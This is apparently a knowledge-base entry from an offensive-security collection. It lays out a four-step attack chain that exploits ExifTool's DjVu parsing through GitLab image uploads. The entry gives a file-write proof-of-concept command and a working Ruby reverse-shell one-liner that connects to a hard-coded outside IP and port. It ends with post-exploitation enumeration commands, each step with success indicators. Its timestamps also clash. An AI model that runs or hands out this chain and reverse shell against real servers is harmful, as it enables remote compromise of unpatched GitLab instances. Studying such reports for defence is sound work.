---
tags:
  - rce
  - gitlab
  - exiftool
  - image-upload
  - reverse-shell
type: attack_chain
tools:
  - '[[tools/ExifTool]]'
  - '[[tools/Ruby]]'
  - '[[tools/Perl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
commands: []
platforms:
  - Web
  - Linux
complexity: medium
procedures:
  - '[[procedures/Prepare-Malicious-DjVu-PoC-File]]'
  - '[[procedures/Upload-Image-to-Trigger-ExifTool-RCE]]'
  - '[[procedures/Establish-Reverse-Shell-via-Injected-Code]]'
  - '[[procedures/Post-Exploitation-System-Enumeration]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
description: >-
  Exploits a remote code execution vulnerability in GitLab's image upload
  processing using ExifTool by uploading a crafted DjVu file disguised as a JPG,
  leading to arbitrary command execution and potential server compromise.
skill_level: advanced
impact_level: high
id: 61ee3567-08ac-4082-bb64-5548cd33d9a0
created_at: '2025-12-11T03:47:58.654Z'
updated_at: '2025-12-11T03:47:58.654Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
---
# GitLab RCE via ExifTool in Image Uploads

Multi-stage attack chain demonstrating remote code execution in GitLab by exploiting ExifTool's handling of DjVu files during image uploads, leading to arbitrary command execution as the git user and potential full server compromise.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Advanced |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare PoC] --> B[Upload Image]
    B --> C[Establish Shell]
    C --> D[Enumerate System]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ExifTool]]
- #unzip
- [[tools/Ruby]]
- [[tools/Perl]]

### Target Environment

- GitLab instance (e.g., GitLab.com or self-hosted)
- Linux server running GitLab Workhorse and ExifTool
- Open ports for reverse shell (e.g., 12345)

### Initial Access Requirements

- Valid GitLab account for creating snippets
- Network access to GitLab web interface
- Attacker-controlled listener for reverse shell

## Detailed Attack Procedures

### Step 1: Prepare Malicious DjVu PoC File - [[procedures/Prepare-Malicious-DjVu-PoC-File]]

**Objective**: Download and extract the proof-of-concept DjVu file disguised as a JPG to inject arbitrary Perl code via ExifTool.

**Instructions**:

Use [[commands/unzip-poc-file]] to extract the PoC:

```bash
unzip echo_vakzz.jpg.zip
```

This extracts echo_vakzz.jpg, a crafted DjVu file with malicious metadata for code injection.

**Expected Output**: Extracted file echo_vakzz.jpg ready for upload.

**Success Indicators**:
- File extraction completes without errors
- Verify file presence with ls

### Step 2: Upload Image to Trigger ExifTool RCE - [[procedures/Upload-Image-to-Trigger-ExifTool-RCE]]

**Objective**: Create a new snippet in GitLab and upload the crafted image to trigger ExifTool processing and execute injected code.

**Instructions**:

Navigate to GitLab's new snippet page and attach the file, which passes it to ExifTool. This executes [[commands/echo-vakzz-to-file]] via qx in Perl eval:

```bash
echo vakzz >/tmp/vakzz
```

**Expected Output**: File /tmp/vakzz created on the server.

**Success Indicators**:
- Upload succeeds
- Server-side file creation confirms RCE

### Step 3: Establish Reverse Shell via Injected Code - [[procedures/Establish-Reverse-Shell-via-Injected-Code]]

**Objective**: Upload a modified PoC to spawn a reverse shell connecting back to the attacker.

**Instructions**:

Upload reverse_shell.jpg, which injects [[commands/ruby-reverse-shell]]:

```bash
ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

Set up a listener on port 12345 to receive the shell.

**Expected Output**: Reverse shell connection established on web-09-sv-gprd.

**Success Indicators**:
- Incoming connection from GitLab server
- Ability to execute commands as git user

### Step 4: Post-Exploitation System Enumeration - [[procedures/Post-Exploitation-System-Enumeration]]

**Objective**: Gather system information from the reverse shell to assess compromise.

**Instructions**:

From the shell, run [[commands/id-user-info]]:

```bash
id
```

Then [[commands/hostname-alias]]:

```bash
hostname -a
```

And [[commands/ps-auxww-processes]]:

```bash
ps auxww
```

**Expected Output**: User info (uid=500(git)), hostname (web-09-sv-gprd), and process list.

**Success Indicators**:
- Commands execute successfully
- Data confirms server identity and running services

## Attack Chain Summary

### Key Achievements

1. Arbitrary code execution as git user
2. Reverse shell on production GitLab server
3. System enumeration for further exploitation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Discovery]]

*Last updated: 2023-10-01*
